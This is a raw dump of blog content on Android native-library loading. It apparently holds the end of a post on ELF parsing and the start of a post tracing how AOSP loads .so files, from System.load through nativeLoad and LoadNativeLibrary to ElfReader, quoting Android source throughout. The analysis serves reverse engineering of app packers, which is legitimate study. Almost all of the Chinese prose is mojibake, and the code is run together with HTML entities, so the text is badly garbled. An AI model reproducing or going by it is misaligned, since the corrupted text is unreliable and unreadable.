strtab_size_; // First page of reserved address space. void* load_start_; // Size in bytes of reserved address space. size_t load_size_; // First page of inaccessible gap mapping reserved for this DSO. void* gap_start_; // Size in bytes of the gap mapping. size_t gap_size_; // Load bias. ElfW(Addr) load_bias_; // Loaded phdr. const ElfW(Phdr)* loaded_phdr_; // Is map owned by the caller bool mapped_by_caller_; // Only used by AArch64 at the moment. GnuPropertySection note_gnu_property_ __unused;&#125;;# AOSP ä¸­è§£æ Elf ç¤ºä¾‹ åœ¨ AOSP ä¸­ï¼Œè°ƒç”¨ ElfReader è§£æ so çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œä¼ å…¥çš„å››ä¸ªå‚æ•°çš„å«ä¹‰å¦‚ä¸‹æ‰€ç¤º realpath : elf çš„è·¯å¾„ fd_ : æ‰“å¼€çš„ elf çš„ fd æ–‡ä»¶æè¿°ç¬¦ file_offset_ : elf æ–‡ä»¶æŒ‡é’ˆçš„å½“å‰åç§»ï¼Œåˆå§‹å€¼ä¸º 0 file_size : elf çš„æ–‡ä»¶å¤§å° //android-platform\\bionic\\linker\\linker.cpp//LoadTask::readbool read(const char* realpath, off64_t file_size) &#123; ElfReader&amp; elf_reader = get_elf_reader(); return elf_reader.Read(realpath, fd_, file_offset_, file_size);&#125;# ElfReader::Read éå¸¸å…¸å‹çš„ elfè§£æäº”ä»¶å¥— ä»£ç ï¼Œç»è¿‡ä¸Šé¢å¯¹äº ELF çš„è¯¦ç»†åˆ†æï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾ç†è§£è¿™äº”ä¸ªå‡½æ•°çš„åŠŸèƒ½äº† //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::Read(const char* name, int fd, off64_t file_offset, off64_t file_size) &#123; if (did_read_) &#123; return true; &#125; name_ = name; fd_ = fd; file_offset_ = file_offset; file_size_ = file_size; if (ReadElfHeader() &amp;&amp; VerifyElfHeader() &amp;&amp; ReadProgramHeaders() &amp;&amp; ReadSectionHeaders() &amp;&amp; ReadDynamicSection()) &#123; did_read_ = true; &#125; return did_read_;&#125;# ReadElfHeader è¯»å– ELF Header //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::ReadElfHeader() &#123; ssize_t rc = TEMP_FAILURE_RETRY(pread64(fd_, &amp;header_, sizeof(header_), file_offset_)); if (rc &lt; 0) &#123; DL_ERR(\"can't read file \\\"%s\\\": %s\", name_.c_str(), strerror(errno)); return false; &#125; if (rc != sizeof(header_)) &#123; DL_ERR(\"\\\"%s\\\" is too small to be an ELF executable: only found %zd bytes\", name_.c_str(), static_cast&lt;size_t>(rc)); return false; &#125; return true;&#125;# VerifyElfHeader åˆ¤æ–­æ˜¯å¦æ˜¯ ELF Header çš„åˆæ³•æ€§ //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::VerifyElfHeader() &#123; if (memcmp(header_.e_ident, ELFMAG, SELFMAG) != 0) &#123; DL_ERR(\"\\\"%s\\\" has bad ELF magic: %02x%02x%02x%02x\", name_.c_str(), header_.e_ident[0], header_.e_ident[1], header_.e_ident[2], header_.e_ident[3]); return false; &#125; // Try to give a clear diagnostic for ELF class mismatches, since they're // an easy mistake to make during the 32-bit/64-bit transition period. int elf_class = header_.e_ident[EI_CLASS];#if defined(__LP64__) if (elf_class != ELFCLASS64) &#123; if (elf_class == ELFCLASS32) &#123; DL_ERR(\"\\\"%s\\\" is 32-bit instead of 64-bit\", name_.c_str()); &#125; else &#123; DL_ERR(\"\\\"%s\\\" has unknown ELF class: %d\", name_.c_str(), elf_class); &#125; return false; &#125;#else if (elf_class != ELFCLASS32) &#123; if (elf_class == ELFCLASS64) &#123; DL_ERR(\"\\\"%s\\\" is 64-bit instead of 32-bit\", name_.c_str()); &#125; else &#123; DL_ERR(\"\\\"%s\\\" has unknown ELF class: %d\", name_.c_str(), elf_class); &#125; return false; &#125;#endif if (header_.e_ident[EI_DATA] != ELFDATA2LSB) &#123; DL_ERR(\"\\\"%s\\\" not little-endian: %d\", name_.c_str(), header_.e_ident[EI_DATA]); return false; &#125; if (header_.e_type != ET_DYN) &#123; DL_ERR(\"\\\"%s\\\" has unexpected e_type: %d\", name_.c_str(), header_.e_type); return false; &#125; if (header_.e_version != EV_CURRENT) &#123; DL_ERR(\"\\\"%s\\\" has unexpected e_version: %d\", name_.c_str(), header_.e_version); return false; &#125; if (header_.e_machine != GetTargetElfMachine()) &#123; DL_ERR(\"\\\"%s\\\" is for %s (%d) instead of %s (%d)\", name_.c_str(), EM_to_string(header_.e_machine), header_.e_machine, EM_to_string(GetTargetElfMachine()), GetTargetElfMachine()); return false; &#125; if (header_.e_shentsize != sizeof(ElfW(Shdr))) &#123; // Fail if app is targeting Android O or above if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has unsupported e_shentsize: 0x%x (expected 0x%zx)\", name_.c_str(), header_.e_shentsize, sizeof(ElfW(Shdr))); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" has unsupported e_shentsize 0x%x (expected 0x%zx)\", name_.c_str(), header_.e_shentsize, sizeof(ElfW(Shdr))); add_dlwarning(name_.c_str(), \"has invalid ELF header\"); &#125; if (header_.e_shstrndx == 0) &#123; // Fail if app is targeting Android O or above if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid e_shstrndx\", name_.c_str()); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" has invalid e_shstrndx\", name_.c_str()); add_dlwarning(name_.c_str(), \"has invalid ELF header\"); &#125; return true;&#125;# ReadProgramHeaders è¯»å– Program Header //android-platform\\bionic\\linker\\linker_phdr.cpp// Loads the program header table from an ELF file into a read-only private// anonymous mmap-ed block.bool ElfReader::ReadProgramHeaders() &#123; phdr_num_ = header_.e_phnum; // Like the kernel, we only accept program header tables that // are smaller than 64KiB. if (phdr_num_ &lt; 1 || phdr_num_ > 65536/sizeof(ElfW(Phdr))) &#123; DL_ERR(\"\\\"%s\\\" has invalid e_phnum: %zd\", name_.c_str(), phdr_num_); return false; &#125; // Boundary checks size_t size = phdr_num_ * sizeof(ElfW(Phdr)); if (!CheckFileRange(header_.e_phoff, size, alignof(ElfW(Phdr)))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid phdr offset/size: %zu/%zu\", name_.c_str(), static_cast&lt;size_t>(header_.e_phoff), size); return false; &#125; if (!phdr_fragment_.Map(fd_, file_offset_, header_.e_phoff, size)) &#123; DL_ERR(\"\\\"%s\\\" phdr mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; phdr_table_ = static_cast&lt;ElfW(Phdr)*>(phdr_fragment_.data()); return true;&#125;# ReadSectionHeaders è¯»å– Section Header //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::ReadSectionHeaders() &#123; shdr_num_ = header_.e_shnum; if (shdr_num_ == 0) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has no section headers\", name_.c_str()); return false; &#125; size_t size = shdr_num_ * sizeof(ElfW(Shdr)); if (!CheckFileRange(header_.e_shoff, size, alignof(const ElfW(Shdr)))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid shdr offset/size: %zu/%zu\", name_.c_str(), static_cast&lt;size_t>(header_.e_shoff), size); return false; &#125; if (!shdr_fragment_.Map(fd_, file_offset_, header_.e_shoff, size)) &#123; DL_ERR(\"\\\"%s\\\" shdr mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; shdr_table_ = static_cast&lt;const ElfW(Shdr)*>(shdr_fragment_.data()); return true;&#125;# ReadDynamicSection è¯»å– Dynamic Section //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::ReadDynamicSection() &#123; // 1. Find .dynamic section (in section headers) const ElfW(Shdr)* dynamic_shdr = nullptr; for (size_t i = 0; i &lt; shdr_num_; ++i) &#123; if (shdr_table_[i].sh_type == SHT_DYNAMIC) &#123; dynamic_shdr = &amp;shdr_table_ [i]; break; &#125; &#125; if (dynamic_shdr == nullptr) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section header was not found\", name_.c_str()); return false; &#125; // Make sure dynamic_shdr offset and size matches PT_DYNAMIC phdr size_t pt_dynamic_offset = 0; size_t pt_dynamic_filesz = 0; for (size_t i = 0; i &lt; phdr_num_; ++i) &#123; const ElfW(Phdr)* phdr = &amp;phdr_table_[i]; if (phdr->p_type == PT_DYNAMIC) &#123; pt_dynamic_offset = phdr->p_offset; pt_dynamic_filesz = phdr->p_filesz; &#125; &#125; if (pt_dynamic_offset != dynamic_shdr->sh_offset) &#123; if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid offset: 0x%zx, \" \"expected to match PT_DYNAMIC offset: 0x%zx\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_offset), pt_dynamic_offset); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" .dynamic section has invalid offset: 0x%zx \" \"(expected to match PT_DYNAMIC offset 0x%zx)\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_offset), pt_dynamic_offset); add_dlwarning(name_.c_str(), \"invalid .dynamic section\"); &#125; if (pt_dynamic_filesz != dynamic_shdr->sh_size) &#123; if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid size: 0x%zx, \" \"expected to match PT_DYNAMIC filesz: 0x%zx\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_size), pt_dynamic_filesz); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" .dynamic section has invalid size: 0x%zx \" \"(expected to match PT_DYNAMIC filesz 0x%zx)\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_size), pt_dynamic_filesz); add_dlwarning(name_.c_str(), \"invalid .dynamic section\"); &#125; if (dynamic_shdr->sh_link >= shdr_num_) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid sh_link: %d\", name_.c_str(), dynamic_shdr->sh_link); return false; &#125; const ElfW(Shdr)* strtab_shdr = &amp;shdr_table_[dynamic_shdr->sh_link]; if (strtab_shdr->sh_type != SHT_STRTAB) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid link(%d) sh_type: %d (expected SHT_STRTAB)\", name_.c_str(), dynamic_shdr->sh_link, strtab_shdr->sh_type); return false; &#125; if (!CheckFileRange(dynamic_shdr->sh_offset, dynamic_shdr->sh_size, alignof(const ElfW(Dyn)))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid offset/size of .dynamic section\", name_.c_str()); return false; &#125; if (!dynamic_fragment_.Map(fd_, file_offset_, dynamic_shdr->sh_offset, dynamic_shdr->sh_size)) &#123; DL_ERR(\"\\\"%s\\\" dynamic section mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; dynamic_ = static_cast&lt;const ElfW(Dyn)*>(dynamic_fragment_.data()); if (!CheckFileRange(strtab_shdr->sh_offset, strtab_shdr->sh_size, alignof(const char))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid offset/size of the .strtab section linked from .dynamic section\", name_.c_str()); return false; &#125; if (!strtab_fragment_.Map(fd_, file_offset_, strtab_shdr->sh_offset, strtab_shdr->sh_size)) &#123; DL_ERR(\"\\\"%s\\\" strtab section mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; strtab_ = static_cast&lt;const char*>(strtab_fragment_.data()); strtab_size_ = strtab_fragment_.size(); return true;&#125;# å‚è€ƒèµ„æ–™ æ·±å…¥æµ…å‡º ELF https://ctf-wiki.org/executable/elf è®¡ç®—æœºé‚£äº›äº‹ (4)â€”â€”ELF æ–‡ä»¶ç»“æ„ è®¡ç®—æœºé‚£äº›äº‹ (5)â€”â€” é“¾æ¥ã€é™æ€é“¾æ¥ã€åŠ¨æ€é“¾æ¥ è®¡ç®—æœºé‚£äº›äº‹ (6)â€”â€” å¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½ä¸è¿è¡Œ","categories":[],"tags":[]},{"title":"å®‰å“soåŠ è½½æµç¨‹æºç åˆ†æ","slug":"android-load-so","date":"2024-02-14T03:19:19.000Z","updated":"2024-07-12T03:12:23.387Z","comments":true,"path":"android-load-so/","link":"","permalink":"https://oacia.dev/android-load-so/","excerpt":"","text":"å¯¹äºæŸäº›åŠ å›ºå£³ï¼ŒåŠ è½½è§£é‡Šå™¨ elf çš„æ–¹å¼ä¸ä¼šæ˜¯å¸¸è§„çš„ System.loadLibrary , è€Œæ˜¯ä»¿ç…§ System.loadLibrary åœ¨ AOSP ä¸­çš„å®ç°æ–¹å¼ï¼Œåœ¨ JNI ä¸­è‡ªå·±å®ç° so çš„åŠ è½½ æœ¬æ¬¡æ‰€ä½¿ç”¨åˆ°çš„ AOSP çš„æºç çš„å®‰å“ç‰ˆæœ¬ä¸º android-12.0.0_r34 # so çš„å¯åŠ¨è¿‡ç¨‹ # System.load åœ¨ Android ä¸­æˆ‘ä»¬æƒ³è¦åŠ è½½ä¸€ä¸ª so æ—¶ï¼Œå¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ é™æ€åŠ è½½ System.loadLibrary(\"native\");è¿™ç§åŠ è½½æ–¹å¼ä¸‹ï¼Œè¦åŠ è½½çš„ so ä¸€èˆ¬å·²ç»å†…ç½®åœ¨ apk çš„ lib/[arch]/ ä¸­ åŠ¨æ€åŠ è½½ String soPath = \"/data/data/com.example.myapp/libmynative.so\";System.load(soPath);è¿™ä¸€ç§åŠ è½½æ–¹å¼å¯ä»¥åŠ è½½ä»»æ„è·¯å¾„ä¸‹çš„ so è¿™é‡Œæˆ‘ä»¬å°†åŠ¨æ€åŠ è½½ï¼Œå³ System.load å‡½æ•°ä½œä¸ºåˆ†æçš„å…¥å£ï¼Œå¯ä»¥å‘ç°å®ƒå®é™…ä¸Šè°ƒç”¨çš„æ˜¯ Runtime.getRuntime().load0 å¯¹äºé™æ€åŠ è½½ System.loadLibrary æ¥è¯´ï¼Œå®ƒè°ƒç”¨çš„å‡½æ•°æ˜¯ Runtime.getRuntime().loadLibrary0(Reflection.getCallerClass(), libname); //android-platform\\libcore\\ojluni\\src\\main\\java\\java\\lang\\System.java/** * Loads the native library specified by the filename argument. The filename * argument must be an absolute path name. * * If the filename argument, when stripped of any platform-specific library * prefix, path, and file extension, indicates a library whose name is, * for example, L, and a native library called L is statically linked * with the VM, then the JNI_OnLoad_L function exported by the library * is invoked rather than attempting to load a dynamic library. * A filename matching the argument does not have to exist in the * file system. * See the JNI Specification for more details. * * Otherwise, the filename argument is mapped to a native library image in * an implementation-dependent manner. * * &lt;p> * The call &lt;code>System.load(name)&lt;/code> is effectively equivalent * to the call: * &lt;blockquote>&lt;pre> * Runtime.getRuntime().load(name) * &lt;/pre>&lt;/blockquote> * * @param filename the file to load. * @exception SecurityException if a security manager exists and its * &lt;code>checkLink&lt;/code> method doesn't allow * loading of the specified dynamic library * @exception UnsatisfiedLinkError if either the filename is not an * absolute path name, the native library is not statically * linked with the VM, or the library cannot be mapped to * a native library image by the host system. * @exception NullPointerException if &lt;code>filename&lt;/code> is * &lt;code>null&lt;/code> * @see java.lang.Runtime#load(java.lang.String) * @see java.lang.SecurityManager#checkLink(java.lang.String) */@CallerSensitivepublic static void load(String filename) &#123; Runtime.getRuntime().load0(Reflection.getCallerClass(), filename);&#125;Reflection.getCallerClass ç¬¬ä¸€ä¸ªä¼ å…¥çš„å‚æ•° Reflection.getCallerClass() ç›¸å…³çš„å®ç°å³æ³¨é‡Šå¦‚ä¸‹ï¼Œè¯»èµ·æ¥å¯èƒ½ä¼šæœ‰ç‚¹ç»•ï¼Œä»€ä¹ˆå«è¿”å›æ–¹æ³•çš„æ–¹æ³•çš„è°ƒç”¨è€…çš„ç±»ï¼Ÿ //android-platform\\libcore\\ojluni\\src\\main\\java\\sun\\reflect\\Reflection.java/** Returns the class of the caller of the method calling this method, ignoring frames associated with java.lang.reflect.Method.invoke() and its implementation. * @CallerSensitive public static native Class&lt;?> getCallerClass(); */ public static Class&lt;?> getCallerClass() &#123; // This method (getCallerClass()) constitutes another stack frame, // so we need to call getStackClass2() rather than getStackClass1(). return VMStack.getStackClass2(); &#125;å…¶å®æŒ‰ç…§é€†å‘çš„è§’åº¦æ¥çœ‹ï¼Œå°±æ˜¯è¿”å›è°ƒç”¨æ ˆçš„æœ€åº•å±‚çš„é‚£ä¸ªç±»ï¼Œä¾‹å¦‚æœ‰ä¸€ä¸ª Class A ç»è¿‡å¦‚ä¸‹çš„è°ƒç”¨è¿‡ç¨‹: Class A-&gt;åå°„1-&gt;åå°„2-&gt;åå°„n-&gt;...-&gt;Reflection.getCallerClass() , æœ€ç»ˆ getCallerClass æ–¹æ³•å°†è¿”å› Class A # Runtime.getRuntime().load0 åœ¨ Runtime.getRuntime().load0 ä¸­è¿›è¡Œäº† filename æ˜¯å¦æ˜¯ ç»å¯¹è·¯å¾„ ä»¥åŠ ç©ºå­—ç¬¦ä¸² çš„æ£€æŸ¥ä¹‹åï¼Œä¾¿å¼€å§‹è°ƒç”¨ nativeLoad çœŸæ­£çš„å»åŠ è½½ so äº† //android-platform\\libcore\\ojluni\\src\\main\\java\\java\\lang\\Runtime.javasynchronized void load0(Class&lt;?> fromClass, String filename) &#123; if (!(new File(filename).isAbsolute())) &#123; throw new UnsatisfiedLinkError( \"Expecting an absolute path of the library: \" + filename); &#125; if (filename == null) &#123; throw new NullPointerException(\"filename == null\"); &#125; String error = nativeLoad(filename, fromClass.getClassLoader()); if (error != null) &#123; throw new UnsatisfiedLinkError(error); &#125;&#125;fromClass.getClassLoader() å‘ nativeLoad ä¸­ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ fromClass.getClassLoader() , åˆ©ç”¨è¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–åˆ° fromClass ç±»çš„ ClassLoader ä¸ºä»€ä¹ˆè¦è·å– ClassLoader å¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ å…¥ nativeLoad? # Runtime.java ä¸­çš„ nativeLoad åœ¨ nativeLoad é‡è½½è°ƒç”¨äº† nativeLoad(String filename, ClassLoader loader, Class&lt;?&gt; caller) , è€Œè¯¥å‡½æ•°çš„å£°æ˜ä¸º native , è¿™ä¾¿æ„å‘³ç€æˆ‘ä»¬å³å°†èµ°å‡º java æ¥åˆ° c++ çš„ä¸–ç•Œäº† //android-platform\\libcore\\ojluni\\src\\main\\java\\java\\lang\\Runtime.javaprivate static String nativeLoad(String filename, ClassLoader loader) &#123; return nativeLoad(filename, loader, null); &#125;private static native String nativeLoad(String filename, ClassLoader loader, Class&lt;?> caller);# Runtime.c ä¸­çš„ nativeLoad åœ¨å¸¸è§„çš„ JNI å‡½æ•°çš„ç¼–å†™è¿‡ç¨‹ä¸­ï¼Œæƒ³è¦è®© java å±‚è°ƒç”¨ JNI ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œè¦ä¹ˆä½¿ç”¨é™æ€æ³¨å†Œï¼Œåˆ©ç”¨ JNIEXPORT å…³é”®å­—å°†è¿™ä¸ªå‡½æ•°å¯¼å‡ºï¼Œæˆ–è€…ä½¿ç”¨ RegisterNatives æ–¹æ³•å»è¿›è¡ŒåŠ¨æ€æ³¨å†Œï¼Œè€Œåœ¨ AOSP å®šä¹‰ nativeLoad æ—¶ï¼Œè¿™ä¸¤ç§æ–¹æ³•éƒ½ä½¿ç”¨åˆ°äº†ï¼Œå¯¹äºå­¦ä¹  JNI çš„æ³¨å†Œè¿‡ç¨‹éå¸¸å…·æœ‰å‚è€ƒæ„ä¹‰ æŸ¥çœ‹ Runtime_nativeLoad å‡½æ•°ï¼Œå¯ä»¥å‘ç°å®ƒç»§ç»­è°ƒç”¨äº† JVM_NativeLoad //android-platform\\libcore\\ojluni\\src\\main\\native\\Runtime.cJNIEXPORT jstring JNICALLRuntime_nativeLoad(JNIEnv* env, jclass ignored, jstring javaFilename, jobject javaLoader, jclass caller)&#123; return JVM_NativeLoad(env, javaFilename, javaLoader, caller);&#125;//these macros below are defined at android-platform\\libnativehelper\\include_platform_header_only\\nativehelper\\jni_macros.h#define FAST_NATIVE_METHOD(className, functionName, signature) \\ MAKE_JNI_FAST_NATIVE_METHOD(#functionName, signature, className ## _ ## functionName)#define NATIVE_METHOD(className, functionName, signature) \\ MAKE_JNI_NATIVE_METHOD(#functionName, signature, className ## _ ## functionName)#define MAKE_JNI_NATIVE_METHOD(name, signature, function) \\ _NATIVEHELPER_JNI_MAKE_METHOD(kNormalNative, name, signature, function)#define _NATIVEHELPER_JNI_MAKE_METHOD(kind, name, sig, fn) \\ MAKE_CHECKED_JNI_NATIVE_METHOD(kind, name, sig, fn)//MAKE_CHECKED_JNI_NATIVE_METHOD is defined at platform\\libnativehelper\\include_platform_header_only\\nativehelper\\detail\\signature_checker.h#define MAKE_CHECKED_JNI_NATIVE_METHOD(native_kind, name_, signature_, fn) \\ ([]() &#123; \\ using namespace nativehelper::detail; /* NOLINT(google-build-using-namespace) */ \\ static_assert( \\ MatchJniDescriptorWithFunctionType&lt;native_kind, \\ decltype(fn), \\ fn, \\ sizeof(signature_)>(signature_),\\ \"JNI signature doesn't match C++ function type.\"); \\ /* Suppress implicit cast warnings by explicitly casting. */ \\ return JNINativeMethod &#123; \\ const_cast&lt;decltype(JNINativeMethod::name)>(name_), \\ const_cast&lt;decltype(JNINativeMethod::signature)>(signature_), \\ reinterpret_cast&lt;void*>(&amp;(fn))&#125;; \\ &#125;)()//NELEM is defined at platform\\libnativehelper\\include\\nativehelper\\JNIHelp.h#define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0])))//jniRegisterNativeMethods is defined at platform\\libnativehelper\\JNIHelp.cint jniRegisterNativeMethods(JNIEnv* env, const char* className, const JNINativeMethod* methods, int numMethods)&#123; ALOGV(\"Registering %s's %d native methods...\", className, numMethods); jclass clazz = (*env)->FindClass(env, className); ALOG_ALWAYS_FATAL_IF(clazz == NULL, \"Native registration unable to find class '%s'; aborting...\", className); int result = (*env)->RegisterNatives(env, clazz, methods, numMethods); (*env)->DeleteLocalRef(env, clazz); if (result == 0) &#123; return 0; &#125; // Failure to register natives is fatal. Try to report the corresponding exception, // otherwise abort with generic failure message. jthrowable thrown = (*env)->ExceptionOccurred(env); if (thrown != NULL) &#123; struct ExpandableString summary; ExpandableStringInitialize(&amp;summary); if (GetExceptionSummary(env, thrown, &amp;summary)) &#123; ALOGF(\"%s\", summary.data); &#125; ExpandableStringRelease(&amp;summary); (*env)->DeleteLocalRef(env, thrown); &#125; ALOGF(\"RegisterNatives failed for '%s'; aborting...\", className); return result;&#125;static JNINativeMethod gMethods[] = &#123; FAST_NATIVE_METHOD(Runtime, freeMemory, \"()J\"), FAST_NATIVE_METHOD(Runtime, totalMemory, \"()J\"), FAST_NATIVE_METHOD(Runtime, maxMemory, \"()J\"), NATIVE_METHOD(Runtime, nativeGc, \"()V\"), NATIVE_METHOD(Runtime, nativeExit, \"(I)V\"), NATIVE_METHOD(Runtime, nativeLoad, \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/Class;)\" \"Ljava/lang/String;\"),&#125;;void register_java_lang_Runtime(JNIEnv* env) &#123; jniRegisterNativeMethods(env, \"java/lang/Runtime\", gMethods, NELEM(gMethods));&#125;# JVM_NativeLoad JVM_NativeLoad è·å–å½“å‰è¿›ç¨‹çš„ javaVM å¯¹è±¡å¹¶è°ƒç”¨ javaVM çš„ LoadNativeLibrary æ–¹æ³• //android-platform\\art\\openjdkjvm\\OpenjdkJvm.ccJNIEXPORT jstring JVM_NativeLoad(JNIEnv* env, jstring javaFilename, jobject javaLoader, jclass caller) &#123; // å®ä¾‹åŒ–ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ ScopedUtfChars filename(env, javaFilename); if (filename.c_str() == nullptr) &#123; return nullptr; &#125; std::string error_msg; &#123; // è·å–å½“å‰è¿›ç¨‹çš„ javaVM å¯¹è±¡ art::JavaVMExt* vm = art::Runtime::Current()->GetJavaVM(); bool success = vm->LoadNativeLibrary(env, filename.c_str(), javaLoader, caller, &amp;error_msg); if (success) &#123; return nullptr; &#125; &#125; // Don't let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF. env->ExceptionClear(); return env->NewStringUTF(error_msg.c_str());&#125;# vm-&gt;LoadNativeLibrary LoadNativeLibrary çš„ä»£ç å¾ˆé•¿ï¼Œç»†çœ‹ä¹‹åå¯ä»¥åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† so åŠ è½½å‰ è¿™ä¸ªéƒ¨åˆ†ä¸»è¦åˆ¤æ–­å³å°†è¢« so æ˜¯å¦ä¹‹å‰å°±å·²ç»è¢«åŠ è½½è¿‡ï¼Œå¦‚æœå·²ç»è¢«åŠ è½½å¥½äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥é€€å‡ºè¿™ä¸ªå‡½æ•°å¹¶è¿”å› so åŠ è½½æ—¶ è¿™ä¸ªéƒ¨åˆ†å°±æ˜¯ AOSP å®ç°åŠ¨æ€é“¾æ¥åº“åŠ è½½çš„æ ¸å¿ƒå®ç°ï¼Œä¹‹åä¼šè¿›è¡Œè¯¦ç»†çš„åˆ†æ å½“æ‰¾åˆ°è¿™ä¸ª so çš„ soinfo ä¹‹å (å…·ä½“æ˜¯åœ¨ do_dlopen ä¸­è¢«æ‰¾åˆ°), ä¼šç«‹å³è°ƒç”¨ soinfo::call_constructors å‡½æ•°ä¾æ¬¡åŠ è½½ init å’Œ init_array å‡½æ•° so åŠ è½½å åœ¨è¿™æœ€åä¸€ä¸ªéƒ¨åˆ†ä¸­ï¼Œå½“ä¸€ä¸ª so è¢«æˆåŠŸåŠ è½½åï¼Œä¼šç«‹å³è°ƒç”¨ so çš„å¯¼å‡ºå‡½æ•°ä¸­çš„ JNI_OnLoad å‡½æ•° (å¦‚æœ JNI_OnLoad å­˜åœ¨çš„è¯) //android-platform\\art\\runtime\\jni\\java_vm_ext.cc// é˜¶æ®µä¸‰ï¼šå½“ so è¢«åŠ è½½ä¹‹åï¼Œç«‹å³è°ƒç”¨å¯¼å‡ºå‡½æ•° JNI_OnLoadbool was_successful = false;void* sym = library->FindSymbol(\"JNI_OnLoad\", nullptr);if (sym == nullptr) &#123; VLOG(jni) &lt;&lt; \"[No JNI_OnLoad found in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; was_successful = true;&#125; else &#123; // Call JNI_OnLoad. We have to override the current class // loader, which will always be \"null\" since the stuff at the // top of the stack is around Runtime.loadLibrary(). (See // the comments in the JNI FindClass function.) ScopedLocalRef&lt;jobject> old_class_loader(env, env->NewLocalRef(self->GetClassLoaderOverride())); self->SetClassLoaderOverride(class_loader); VLOG(jni) &lt;&lt; \"[Calling JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; using JNI_OnLoadFn = int(*)(JavaVM*, void*); JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn>(sym); int version = (*jni_on_load)(this, nullptr); if (IsSdkVersionSetAndAtMost(runtime_->GetTargetSdkVersion(), SdkVersion::kL)) &#123; // Make sure that sigchain owns SIGSEGV. EnsureFrontOfChain(SIGSEGV); &#125; self->SetClassLoaderOverride(old_class_loader.get()); if (version == JNI_ERR) &#123; StringAppendF(error_msg, \"JNI_ERR returned from JNI_OnLoad in \\\"%s\\\"\", path.c_str()); &#125; else if (JavaVMExt::IsBadJniVersion(version)) &#123; StringAppendF(error_msg, \"Bad JNI version returned from JNI_OnLoad in \\\"%s\\\": %d\", path.c_str(), version); // It's unwise to call dlclose() here, but we can mark it // as bad and ensure that future load attempts will fail. // We don't know how far JNI_OnLoad got, so there could // be some partially-initialized stuff accessible through // newly-registered native method calls. We could try to // unregister them, but that doesn't seem worthwhile. &#125; else &#123; was_successful = true; &#125; VLOG(jni) &lt;&lt; \"[Returned \" &lt;&lt; (was_successful ? \"successfully\" : \"failure\") &lt;&lt; \" from JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\";&#125; å®Œæ•´çš„ LoadNativeLibrary ä»£ç  //android-platform\\art\\runtime\\jni\\java_vm_ext.ccbool JavaVMExt::LoadNativeLibrary(JNIEnv* env, const std::string&amp; path, jobject class_loader, jclass caller_class, std::string* error_msg) &#123; error_msg->clear(); // é˜¶æ®µä¸€ï¼šåˆ¤æ–­ç›®æ ‡ so æ˜¯å¦å·²ç»è¢«åŠ è½½è¿‡ // See if we've already loaded this library. If we have, and the class loader // matches, return successfully without doing anything. // TODO: for better results we should canonicalize (è§„èŒƒåŒ–) the pathname (or even compare // inodes). This implementation is fine if everybody is using System.loadLibrary. SharedLibrary* library; Thread* self = Thread::Current(); &#123; // TODO: move the locking (and more of this logic) into Libraries. MutexLock mu(self, *Locks::jni_libraries_lock_); library = libraries_->Get(path); &#125; void* class_loader_allocator = nullptr; std::string caller_location; &#123; ScopedObjectAccess soa(env); // As the incoming class loader is reachable/alive during the call of this function, // it's okay to decode it without worrying about unexpectedly marking it alive. ObjPtr&lt;mirror::ClassLoader> loader = soa.Decode&lt;mirror::ClassLoader>(class_loader); ClassLinker* class_linker = Runtime::Current()->GetClassLinker(); if (class_linker->IsBootClassLoader(soa, loader.Ptr())) &#123; loader = nullptr; class_loader = nullptr; if (caller_class != nullptr) &#123; 